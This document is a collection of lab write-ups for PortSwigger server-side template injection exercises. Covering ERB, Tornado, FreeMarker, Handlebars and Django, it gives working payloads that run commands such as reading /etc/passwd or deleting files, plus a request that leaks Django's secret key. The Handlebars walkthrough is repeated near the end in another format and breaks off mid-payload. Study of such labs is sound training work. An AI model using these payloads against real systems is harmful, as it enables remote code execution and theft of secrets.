01 Basic server-side template injection
=======================================

This lab is vulnerable to server-side template injection due to the unsafe
construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute
arbitrary code, then delete the morale.txt file from Carlos's home directory.

References:

-   https://portswigger.net/web-security/server-side-template-injection/exploiting

-   https://www.trustedsec.com/blog/rubyerb-template-injection/

-   https://twitter.com/harshbothra_/status/1498324305872318464?lang=en

![img](media/1e38bf09150e6abe96fd5bb9864e7b62.png)

The first post returns an error:

![img](media/43f003677fb3a38eed6bb7cd2782dd6e.png)

This is generated with a GET request which controls the displayed message:

![img](media/27a2ded99a9579bc78aa0b76e8c78ec3.png)

I tried to send the URL-encoded version of this payload from the examples:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?message=%3c%25%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%69%6d%70%6f%72%74%20%6f%73%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%78%3d%6f%73%2e%70%6f%70%65%6e%28%27%69%64%27%29%2e%72%65%61%64%28%29%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%25%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24%7b%78%7d
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

And generated the following error:

![img](media/f014dbb70bc1817e206d3a919a47b20a.png)

We can find information about SSTI in Erb in this [Trustedsec
blog](https://www.trustedsec.com/blog/rubyerb-template-injection/):

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?message=<%=+4*4+%>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/09d5f2c2d1ad7fc7dffd5bcbe51886db.png)

It is possible to execute code with a payload like this:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
GET /?message=<%=+system('cat+/etc/passwd')+%>

GET /?message=<%=+system('rm+/home/carlos/morale.txt')+%>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/f80a5517ef27e2270079660ba7939dd5.png)

![img](media/010daa5898cf6ae480a7dfd6a8af1d6b.png)

02 Basic server-side template injection (code context)
======================================================

This lab is vulnerable to server-side template injection due to the way it
unsafely uses a Tornado template. To solve the lab, review the Tornado
documentation to discover how to execute arbitrary code, then delete the
morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter

Hint: Take a closer look at the "preferred name" functionality.

References:

-   https://portswigger.net/web-security/server-side-template-injection/exploiting

![img](media/1e38bf09150e6abe96fd5bb9864e7b62.png)

It is possible to update the email and set a preferred name:

![img](media/171e42a0cad46883fa2d2a499028c651.png)

![img](media/f52de19d223b660af15ad3f110b6ca44.png)

If you change it to the nickname, in the comments you see H0td0g:

![img](media/ebc2142a0fb2a56941fc035e3ac973e1.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{{2*2}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/434c1fcac5cf9230adc6ee7ba9f1c8b2.png)

![img](media/9097f88eebe458e2193db98ab64f93a7.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("whoami").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/31e771cd7f4d9782976860f219272fa5.png)

![img](media/54f41bdb273d84d71b06765343c322d2.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
POST /my-account/change-blog-post-author-display HTTP/2
...

blog-post-author-display=user.nickname}}{%+import+os+%}{{os.popen("rm+/home/carlos/morale.txt").read()}}&csrf=PdLe58H5wvdQEv1PtPmQOJMvRz3krZgs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d471012866aeda72fb4d20ea3f6c7198.png)

03 Server-side template injection using documentation
=====================================================

This lab is vulnerable to server-side template injection. To solve the lab,
identify the template engine and use the documentation to work out how to
execute arbitrary code, then delete the morale.txt file from Carlos's home
directory.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

Hint: You should try solving this lab using only the documentation. However, if
you get really stuck, you can try finding a well-known exploit by \@albinowax
that you can use to solve the lab.

References:

-   https://portswigger.net/web-security/server-side-template-injection/exploiting

-   https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection\#freemarker

![img](media/83ef8cb0ae2e237e7a93a712315a6ded.png)

It is possible to edit the templates of the posts:

![img](media/972bcea038634a42e8755d04b91f8590.png)

We find there are values calculated with the format "\${product.X}":

![img](media/d34f4f8d202733e9160e9be65dc8fd5e.png)

We can execute for example this payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
${3*3}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/54fdd0c195c29dc2afbf64b212c38eba.png)

I tried the Mako's payload from the example and generated an error:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<%
                import os
                x=os.popen('id').read()
                %>
                ${x}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/7922cd4095429a7b76d5b98a0672dcf8.png)

The payload format is:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
${"freemarker.template.utility.Execute"?new()("id")}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/b9986dd5cde6e9f38fb447a29baabef6.png)

Payload to delete the file:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

04 Server-side template injection in an unknown language with a documented exploit
==================================================================================

This lab is vulnerable to server-side template injection. To solve the lab,
identify the template engine and find a documented exploit online that you can
use to execute arbitrary code, then delete the morale.txt file from Carlos's
home directory.

References:

-   http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

-   https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

-   https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

Generated link:
https://0ab300360386552481b34d2700c600da.web-security-academy.net

The content of the message is reflected in the HTML inside a div element:

![img](media/50f8ab379f4f82c1d4da0400618b0d0b.png)

Checking with
https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=TEST:

![img](media/f6a37e02ad27d66d095b039b1f91bb96.png)

Error with
https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message={{7\*7}}.
It seems it uses Node.js and handlebars:

![img](media/bc43539777ed2bf2c53f3a63be1536ef.png)

I will follow:
http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

{{this.**proto**}} with
https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message={{this.**proto**}}:

![img](media/bdd4b7a73e5949783dcc29e6426919ed.png)

Get process.env with:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Url-encode it and get the content with
https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%72%6f%63%65%73%73%2e%65%6e%76%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d:

![img](media/f81b6d2ccea5a4e97985e5882d82992d.png)

Execute ls -la:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').spawn('ls',['-la']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Url-encode it and get the content with
https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%73%70%61%77%6e%28%27%6c%73%27%2c%5b%27%2d%6c%61%27%5d%29%2e%73%74%64%6f%75%74%2e%6f%6e%28%27%64%61%74%61%27%2c%20%66%75%6e%63%74%69%6f%6e%20%28%64%61%74%61%29%20%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%6f%77%6e%27%2b%20%64%61%74%61%29%3b%20%7d%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d:

![img](media/ad12b68c2d1b8580f419b80fbfbdaca7.png)

cat /etc/passwd:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').spawn('cat',['/etc/passwd']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/bef00d2d3311fbd3316825fa9bdf1fe6.png)

pwd:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').spawn('pwd',[' ']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/2ac99d201eb4be11d17422917a126b72.png)

The solution is directly in
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection...

![img](media/84ed39e65f92f63d253fa6bad9a05f03.png)

05 Server-side template injection with information disclosure via user-supplied objects
=======================================================================================

This lab is vulnerable to server-side template injection due to the way an
object is being passed into the template. This vulnerability can be exploited to
access sensitive data.

To solve the lab, steal and submit the framework's secret key.

You can log in to your own account using the following credentials:
content-manager:C0nt3ntM4n4g3r

References:

-   https://portswigger.net/web-security/server-side-template-injection/exploiting

![img](media/5a0b5de6eb1f90c03cee0370b768cefe.png)

It is possible to edit the templates of the posts:

![img](media/82b4841d98cfca97dfb162174af40b44.png)

We find there are values calculated with the format "\${product.X}":

![img](media/9419ae60dff19d7f5e9707afea818ed6.png)

Trying to add the payload “{{3\*3}}” generates the following stack trace:

![img](media/f8f173c507caf4e33a265706577de2eb.png)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Traceback (most recent call last):  File "<string>", line 11, in <module>  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 191, in __init__    self.nodelist = self.compile_nodelist()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 230, in compile_nodelist    return parser.parse()  File "/usr/local/lib/python2.7/dist-packages/django/template/base.py", line 486, in parse    raise self.error(token, e)django.template.exceptions.TemplateSyntaxError: Could not parse the remainder: '*3' from '3*3'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Knowing it uses a Django template we can leak debug information with the
payload:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{% debug %}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/daaf09a13cede72977d72cf133f99ade.png)

There is an element “settings” in Django of type UserSettingsHolder:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{settings}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/d69cc7c6bbe777825b7d3868dcc60d75.png)

It contains a SECRET_KEY field:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
{{settings.SECRET_KEY}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![img](media/12c83732649e9e6439a8368b27aa013d.png)


# 12 - Server-side template injection in an unknown language with a documented exploit

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and find a documented exploit online that you can use to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

---------------------------------------------

References:

- http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

- https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet

---------------------------------------------

Generated link: https://0ab300360386552481b34d2700c600da.web-security-academy.net

The content of the message is reflected in the HTML inside a div element:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/1.png)

Checking with https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=TEST:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/2.png)

Error with https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message={{7*7}}. It seems it uses Node.js and handlebars:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/3.png)

I will follow: http://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html

{{this.__proto__}} with https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message={{this.__proto__}}:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/4.png)

Get process.env with:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return JSON.stringify(process.env);"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

Url-encode it and get the content with https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%4a%53%4f%4e%2e%73%74%72%69%6e%67%69%66%79%28%70%72%6f%63%65%73%73%2e%65%6e%76%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/5.png)

Execute ls -la:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').spawn('ls',['-la']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
``` 

Url-encode it and get the content with https://0ab300360386552481b34d2700c600da.web-security-academy.net/?message=%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%73%70%61%77%6e%28%27%6c%73%27%2c%5b%27%2d%6c%61%27%5d%29%2e%73%74%64%6f%75%74%2e%6f%6e%28%27%64%61%74%61%27%2c%20%66%75%6e%63%74%69%6f%6e%20%28%64%61%74%61%29%20%7b%63%6f%6e%73%6f%6c%65%2e%6c%6f%67%28%27%6f%77%6e%27%2b%20%64%61%74%61%29%3b%20%7d%29%3b%22%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0a%7b%7b%2f%77%69%74%68%7d%7d:



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/6.png)

cat /etc/passwd:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').spawn('cat',['/etc/passwd']).stdout.on('data', function (data) {console.log('own'+ data); });"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
``` 



![img](images/12%20-%20Server-side%20template%20injection%20in%20an%20unknown%20language%20with%20a%20documented%20exploit/7.png)

pwd:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
